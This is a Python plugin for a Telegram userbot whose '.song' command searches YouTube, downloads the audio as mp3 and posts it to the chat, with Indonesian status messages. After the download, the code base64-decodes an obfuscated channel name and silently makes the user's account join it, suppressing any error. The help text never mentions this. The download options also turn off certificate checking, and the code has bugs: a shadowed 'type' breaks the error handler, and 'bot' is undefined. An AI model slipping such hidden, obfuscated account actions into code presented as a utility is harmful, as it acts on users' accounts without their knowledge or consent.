# Copyright (C) 2020 TeamUltroid
# Ported By Vicky / @Vckyouuu From Ultroid
# Full Love From Vicky For All Lord
# @LORDUSERBOT_GROUP
# @sharinguserbot

import json
import os

import pybase64
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos

from userbot import ALIVE_NAME, CMD_HELP
from userbot.events import register


@register(outgoing=True, pattern=r"^\.song (.*)")
async def download_video(event):
    await event.edit("`Processing...`")
    url = event.pattern_match.group(1)
    if not url:
        return await event.edit("**ERROR!**\nGunakan Perintah `.song <judul lagu>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await event.edit("`Tidak dapat menemukan lagu yang cocok...`")
    type = "audio"
    await event.edit(f"`Sedang Mendownload {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await event.edit("`Mendapatkan informasi Lagu...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await event.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await event.edit("`Konten unduhan terlalu pendek.`")
        return
    except GeoRestrictedError:
        await event.edit(
            "`Video tidak tersedia karena batasan geografis yang diberlakukan oleh situs web.`"
        )
        return
    except MaxDownloadsReached:
        await event.edit("`Maksimal Download telah tercapai.`")
        return
    except PostProcessingError:
        await event.edit("`Ada kesalahan selama pemrosesan posting.`")
        return
    except UnavailableVideoError:
        await event.edit("`Media tidak tersedia dalam format yang diminta.`")
        return
    except XAttrMetadataError as XAME:
        await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await event.edit("`Terjadi kesalahan selama ekstraksi info.`")
        return
    except Exception as e:
        await event.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
        await bot(JoinChannelRequest(sung))
    except BaseException:
        pass
    upteload = """
Sedang Mengunggah, Mohon Menunggu...
Judul - {}
Artis - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await event.edit(f"`{upteload}`")
    await event.client.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"**🎧 Judul Lagu :** `{rip_data['title']}`\n**🧑🏻‍💻 Artis:** `{rip_data['uploader']}`\n\n**👑 Find By :** `{ALIVE_NAME}`",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    os.remove(f"{rip_data['id']}.mp3")


CMD_HELP.update(
    {
        "song": "**Plugin : **`song`\
        \n\n  •  **Syntax :** `.song` <judul lagu>`\
        \n  •  **Function : **Untuk Mendownload Lagu.\
    "
    }
)
